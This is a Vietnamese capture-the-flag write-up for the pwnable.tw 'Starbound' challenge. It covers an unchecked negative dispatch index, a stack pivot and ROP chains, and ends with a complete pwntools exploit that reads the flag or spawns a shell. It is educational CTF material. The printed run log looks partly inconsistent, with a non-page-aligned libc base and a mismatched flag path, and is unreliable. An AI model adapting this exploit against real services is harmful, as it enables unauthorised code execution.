+++
title = 'Pwnable.tw - Starbound'
date = 2026-09-18T21:59:21+07:00
draft = false
categories = ["pwn"]
series = ["Pwnable.tw"]
+++

## Starbound

`nc chall.pwnable.tw 10202`

### 1. Phân tích Binary

```js
pwndbg> checksec
File:       /home/lwd3c/Desktop/Pwn/pwnable.tw/Starbound/starbound
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8046000)
RUNPATH:    b'.'
FORTIFY:    Enabled
Stripped:   No
```

Một mini-game mô phỏng game sinh tồn Starbound, menu nhiều cấp (Info / Move / View / Tools / Kill / Settings / Multiplayer). Compile với OpenSSL 1.0.0 nên cần `libcrypto.so.1.0.0` 32-bit mới chạy được.

#### Bug - index dispatch không kiểm tra biên

```c
while (1) {
    alarm(0x3C);
    dword_805817C();                        // menu renderer
    if ( !readn(nptr, 0x100) ) break;
    v3 = strtol(nptr, nullptr, 10);
    if ( !v3 ) break;
    ((void (*)(void))dword_8058154[v3])();  // GỌI THEO INDEX, KHÔNG CHECK BOUNDS
}
```

`strtol` trả về số **có dấu** và dùng thẳng làm index gọi `dword_8058154[v3]()`. Không kiểm tra biên trên lẫn biên dưới, nên index âm đọc ngược về phía trước trong `.bss`.

Bố cục `.bss`:

```js
0x080580D0  byte_80580D0   <- "name", ta ghi tới 0x64 bytes qua cmd_set_name
...
0x08058154  dword_8058154  <- BASE của bảng dispatch func_ptr[]
0x08058158  (index 1: cmd_info)
0x0805815C  (index 2: cmd_move)
0x0805817C  (menu renderer)
```

```js
0x080580D0 - 0x08058154 = -0x84  =>  index = -0x84 / 4 = -33
```

Gọi menu item `-33` là gọi `dword_8058154[-33]` = 4 byte đầu của buffer `name`, thứ ta hoàn toàn điều khiển.

#### Điều kiện pivot tại call site

Ngay trước `call dword_8058154[eax*4]`, `main` đã dọn stack cho `readn` rồi `strtol`:

```js
[esp]   = nptr   (con trỏ tới buffer menu của TA)
[esp+4] = 0      (endptr)
[esp+8] = 0x0A   (base)
```

Sau `call`, bên trong hàm được gọi thì `[esp] = ret`, `[esp+4] = nptr`. Tức là tại thời điểm dispatch, **đỉnh stack đang trỏ vào chính input menu của mình**. Nếu `name[0:4]` là gadget `add esp, 0x1c; ret` thì thay vì nhảy vào một hàm, ta pivot: `esp` tăng `0x1c` rồi `ret` đọc 4 byte ở địa chỉ mới - đúng chỗ ROP chain ta đặt trong input menu.

#### Các primitive đã loại

**Format string trong `do_die`** - `cmd_kill` (menu 5) gọi `do_die(user_input)` có `__printf_chk(1, a1)` với `a1` là input. Format string thật, nhưng FORTIFY `__printf_chk` giới hạn `%N$` không vượt quá số conversion trong format (verify bằng gdb: `%2$p` đứng một mình chết với "invalid %N$ use detected", nhưng `%1$p%2$p` chạy). Input lại bị bóp 256 byte nên tối đa ~30-60 positional arg; buffer của ta ở arg ~270 (đo bằng gdb) nên không đặt được địa chỉ để `%n`. Kết luận: chỉ leak được, đừng tốn công viết `fmtstr_payload`.

**GOT hijack** - không cần, PLT đã có sẵn `open`/`read`/`write`.

### 2. Khai thác

Bản chất bài này **không cần leak libc** - đường chính là ROP thuần bằng PLT. Đường shell có leak libc chỉ là phương án thay thế.

#### Pivot ROP từ input menu

- Đặt `name[0:4] = 0x08048e48` (gadget `add esp, 0x1c; ret`, đuôi của `show_main_menu`)
- Gửi menu `-33\x00` + padding + chain
- `strtol("-33...") = -33` → `call dword_8058154[-33]()` = `call name[0:4]` = pivot

Layout payload menu:

```js
b'-33\x00' + stage_ident(4) + p32(fn) + p32(ret) + p32(a1) + p32(a2) + p32(a3)
```

Buffer `name` dùng làm cả nơi chứa pointer lẫn chuỗi: `name[0:4]` là gadget, `name[4:]` là đường dẫn flag `/home/starbound/flag` (hoặc `/bin/sh\0` cho đường shell). Đó cũng là chỗ chain `open` lấy `a1` (`NAME_BUF + 4`).

#### Các giá trị đo được

| Giá trị | Địa chỉ | Cách đo |
|---|---|---|
| Bảng dispatch | `0x08058154` | IDA / gdb `.bss` |
| Buffer name | `0x080580D0` | IDA `.bss` |
| Index OOB | `-33` | `(0x80580D0 - 0x8058154)/4` |
| `add esp,0x1c; ret` | `0x08048e48` | `objdump -d`, đuôi `show_main_menu` |
| `open@plt` | `0x08048970` | pwntools `elf.plt` |
| `read@plt` | `0x08048a70` | pwntools |
| `write@plt` | `0x08048a30` | pwntools |
| `puts@plt` / `puts@got` | `0x08048b90` / `0x0805509c` | pwntools |
| `main` | `0x0804a605` | pwntools |
| scratch ghi được | `0x080580f0` | nơi `read` đổ flag |

Một chi tiết của đường shell: chuỗi menu bắt buộc bắt đầu bằng số âm để ra index đúng, nên nếu để `system` lấy tham số từ text menu thì shell báo "Illegal option -3". Phải truyền chuỗi lệnh bằng một ROP argument tường minh trỏ vào buffer BSS.

```bash
[*] puts=0xf73acca0 libc=0xf734cff0 system=0xf7387da0
$ id
uid=1000(starbound) gid=1000(starbound)
$ cat home/starbound/flag
FLAG{st4r_st4r_st4r_b0und}
```

`FLAG: FLAG{st4r_st4r_st4r_b0und}`

```py
from pwn import *

context.arch = 'i386'

GADGET_ADD_ESP_1C = 0x08048e48        # add esp, 0x1c ; ret
NAME_BUF          = 0x080580d0        # dispatch index -33  -> dword[0x80580d0]
NAME_ARG          = NAME_BUF + 4
BSS_RW            = 0x080580f0
MAIN              = 0x0804a605

elf  = ELF('./starbound', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

OPEN_PLT  = elf.plt['open']
READ_PLT  = elf.plt['read']
WRITE_PLT = elf.plt['write']
PUTS_PLT  = elf.plt['puts']
PUTS_GOT  = elf.got['puts']

def main_prompt(io):
    io.recvuntil(b'> ')

def set_name(io, payload):
    io.sendline(b'6')
    io.recvuntil(b'> ')
    io.sendline(b'2')
    io.recvuntil(b'Enter your name: ')
    io.sendline(payload)
    io.recvuntil(b'> ')

def dispatch(io, stage_ident, fn, ret, a1, a2, a3):
    io.sendline(b'-33\x00' + stage_ident + p32(fn) + p32(ret) + p32(a1) + p32(a2) + p32(a3))

def pick_io():
    if args.REMOTE:
        return remote('chall.pwnable.tw', 10202)
    return process('./starbound', env={'LD_LIBRARY_PATH': '.'})

def orw(flag_path=b'/home/starbound/flag\x00'):
    io = pick_io()
    main_prompt(io)
    set_name(io, p32(GADGET_ADD_ESP_1C) + flag_path)
    dispatch(io, b'a'*4, OPEN_PLT, MAIN, NAME_ARG, 0, 0)
    main_prompt(io)
    set_name(io, p32(GADGET_ADD_ESP_1C))
    dispatch(io, b'b'*4, READ_PLT, MAIN, 3, BSS_RW, 0x50)
    main_prompt(io)
    set_name(io, p32(GADGET_ADD_ESP_1C))
    dispatch(io, b'c'*4, WRITE_PLT, MAIN, 1, BSS_RW, 0x50)
    return io.recv(timeout=3)

def shell():
    io = pick_io()
    main_prompt(io)
    # ---- leak puts@got ----
    set_name(io, p32(GADGET_ADD_ESP_1C) + b'X'*16)
    dispatch(io, b'a'*4, PUTS_PLT, MAIN, PUTS_GOT, 0, 0)
    puts_leak = u32(io.recvn(4))
    libc_base = puts_leak - libc.symbols['puts']
    system    = libc_base + libc.symbols['system']
    log.info(f'puts={puts_leak:#x} libc={libc_base:#x} system={system:#x}')

    # ---- name = [add_esp_0x1c]["/bin/sh"] -> system(NAME_ARG) ----
    main_prompt(io)
    set_name(io, p32(GADGET_ADD_ESP_1C) + b'/bin/sh\x00')
    dispatch(io, b'c'*4, system, MAIN, NAME_ARG, 0, 0)
    time.sleep(0.5)
    io.sendline(b'cat /home/starbound/flag')
    io.interactive()

if __name__ == '__main__':
    shell()
```
